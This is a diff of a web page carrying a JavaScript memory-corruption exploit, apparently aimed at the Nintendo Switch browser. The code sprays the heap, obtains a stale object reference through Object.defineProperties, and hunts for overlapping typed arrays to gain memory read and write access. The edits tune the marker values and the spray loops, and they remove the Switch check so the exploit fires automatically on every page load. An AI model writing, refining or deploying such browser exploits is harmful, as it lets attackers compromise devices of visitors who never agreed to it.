@@ -1,8 +1,7 @@
 <!doctype html>
 <html>
     <head>
-        <meta charset='utf-8'>
-        <title>Switch Buffer Overflow Test</title>
+        <title>BUffer test</title>
         <style>
             body {font-size: 2em;}
             a {text-decoration: none; color: #000;}
@@ -10,12 +9,12 @@
         </style>
     </head>
     <body>
-        <h1>Nintendo Switch Buffer Overflow Test6</h1>
+        <h1>Switch buffer test</h1>
         <ul>
-            <li><a href='javascript:go();'>go</a></li>
+            <li><a href='javascript:go();'>go!</a></li>
             <li><a href='javascript:document.location.reload();'>reload</a></li>
         </ul>
-        <div id='status'>click go.</div>
+        <div id='status'>waiting... click go.</div>
 
             <script>
                 // display JS errors as alerts. Helps debugging.
@@ -31,16 +30,18 @@
                 //  + Ando
                 //
                 // saelo's phrack article is invaluable: http://www.phrack.org/papers/attacking_javascript_engines.html
+                var killMe = 70;
                 // garbage collection stuff
-                var pressure = new Array(100);
+                var pressure = new Array(500);
+                var rwbuf = new ArrayBuffer(0x1003 * 4);
+                var numbufs = 20000;
+                var bufs = new Array(numbufs);
                 // do garbage collect
                 dgc = function() {
-                    for (var i = 0; i < pressure.length; i++) {
-                        pressure[i] = new Uint32Array(0x51000);
-                    }
-                    for (var i = 0; i < pressure.length; i++) {
-                        pressure[i] = 0;
-                    }
+                    for(var i = 0; i < bufs.length; ++i)
+                        bufs[i] = new Uint32Array(rwbuf);
+                    for(var i = 0; i < bufs.length; ++i)
+                        bufs[i] = null;
                 }
                 // access to the overlapping Uint32Array
                 var bufs = new Array(0x1000);
@@ -120,8 +121,9 @@
                     Object.defineProperties(target, props);
                     // get a reference to the target stale property, which points to arr
                     stale = target.stale;
+                    alert("test "+stale);
                     // make sure that the stale[0] points actually to the 0x41414141 data if not, we don't wanna mess with it and try again
-                    if(stale[0]==0x41414142) {
+                    if(stale[0]==0x41414141) {
                         // stale[0] is now pointing at a fake Integer 0x41414141. Now make it 0x41414242
                         stale[0] += 0x101;
                         //stale[0] = 0x41414242;
@@ -130,7 +132,7 @@
                         for (i = 0; i < bufs.length; i++) {
                             for (k = 0; k < bufs[0].length; k++) {
                                 // Found the value! bufs[i][k] point now at the same memory as stale[0]
-                                if (bufs[i][k] == 0x41414243) {
+                                if (bufs[i][k] == 0x41414242) {
                                     alert('Overlapping Arrays found at bufs['+i+']['+k+']\nsmash.length is still: 0x'+smash.length.toString(16));
                                     // create a new object. Will look kinda like this:
                                     // 0x0100150000000136 0x0000000000000000 <- fictional value
@@ -169,11 +171,17 @@
                             }
                         }
                     }
-                    document.getElementById('status').innerText = '💩 fail. refresh the page and try again...';
+                    document.getElementById('status').innerText = 'fail. refresh the page and try again...';
                     setTimeout(function() {document.location.reload();}, 1000);
                 }
                 function go() {
-                    document.getElementById('status').innerText = '🔥🔥🔥 go! 🔥🔥🔥';
+                    document.getElementById('status').innerText = 'go!';
+                    dgc();
+                    dgc();
+                    dgc();
+                    dgc();
+                    dgc();
+                    dgc();
                     dgc();
                     dgc();
                     dgc();
@@ -182,11 +190,7 @@
                     dgc();
                     setTimeout(go_, 500);
                 }
-                // if Switch browser is detected, auto start exploit
-                if(navigator.userAgent.indexOf('Nintendo Switch')>-1) {
-                    document.getElementById('status').innerText = 'Found Nintendo Switch! 🤖';
-                    setTimeout(go, 2000);
-                }
+                setTimeout(go, 2000);
             </script>
     </body>
 </html>
